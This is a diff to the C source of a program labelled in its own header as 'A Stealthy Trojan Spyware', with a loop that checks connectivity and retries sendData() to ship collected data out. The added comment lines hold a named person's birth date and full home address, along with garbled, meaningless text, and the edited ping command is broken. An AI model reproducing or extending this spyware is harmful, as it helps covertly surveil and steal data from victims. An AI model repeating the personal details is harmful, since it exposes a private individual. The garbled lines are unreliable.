@@ -1,6 +1,11 @@
 
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: A Stealthy Trojan Spyware.
+* fadliwiryawirawan 
+* date birthday : 11-september-1993 Indonesian bogor parung 16330 pamegarsari rt 06/ rw 02 nom57 
+* meta g20
+* Microsoft opinions have or xor nor = license @copyrighy legalism 
+* software Management sytem regulatory
 **/
 
 #include <windows.h>
@@ -47,7 +52,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.com -n 1")){ ///check connection
+            if(!system("ping www.google.co.uk-n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
